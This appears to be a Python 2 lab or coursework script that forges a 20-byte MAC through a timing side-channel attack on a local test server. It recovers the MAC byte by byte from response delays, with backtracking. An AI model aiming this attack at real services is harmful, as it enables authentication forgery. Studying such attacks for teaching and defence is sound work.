import urllib2
import time

def two_space_hex(hex_str):
   if len(hex_str) == 3:
      return '0' + hex_str[2]
   else:
      return hex_str[2:]

def taskIVA():
	mac = '0' * 40
	knownVals = ''
	numFound = 0
	testVal = 0
	lastTime = 0
	maxTime = 0
	maxVal = ''
	while(True):
		testMac = knownVals + two_space_hex(hex(testVal)) + mac[(numFound + 1)*2:]

		totVals = []

		for i in xrange(0, 5):
			start = time.time()
			response = urllib2.urlopen('http://localhost:8080/?q=foo&mac=' + testMac)
			stop = time.time()

			if(response.read().find("Invalid signature") == -1):
				print testMac
				quit()

			totVals.append(stop - start)

		totVals.sort()
		tot = totVals[2]
		#print hex(testVal) + ': ' + str(tot)
		#85b0118f691ab66f68fe

		# if tot > maxTime and tot < ((numFound+1) * 0.02) + 0.03:
		# 	maxTime = tot
		# 	maxVal = two_space_hex(hex(testVal))

		# if testVal == 255:
		# 	if maxTime < ((numFound+1) * 0.02) + 0.01:
		# 		print 'Backtracking...'
		# 		if numFound > 0:
		# 			numFound-= 1
		# 			print 'old: ' + knownVals
		# 			knownVals = knownVals[:-2]
		# 			print 'new: ' + knownVals

		# 	else:
		# 		knownVals += maxVal
		# 		print str(numFound+1) + "/20:" + knownVals 
		# 		print 'maxTime: ' + str(maxTime)
		# 		numFound += 1
		# 	testVal = -1
		# 	maxTime = 0

		# testVal += 1

		if tot >= 0.05 * (numFound + 1): #and tot < 0.05 * (numFound + 1):	
			numFound += 1 
			knownVals += two_space_hex(hex(testVal))
			
			testVal = 0
			lastTime = tot
			print "tot time: " + str(tot)
			print "lower bound: " + str(0.023 * (numFound) + .005)
			print "upper bound: " + str(0.04 * (numFound))
			#print "yay!: " + testMac
			print str(numFound) + "/20:" + testMac
		elif testVal == 255:
			print 'Backtracking...'
			if numFound > 0:
				numFound-= 1
				print 'old: ' + knownVals
				testVal = ord(knownVals[-2:].decode("hex"))
				knownVals = knownVals[:-2]

				print 'new: ' + knownVals
				#testVal = 0
		else:
			testVal+= 1


	html = response.read()
	print html


def main():
	
	taskIVA()

if __name__ == '__main__':
   main()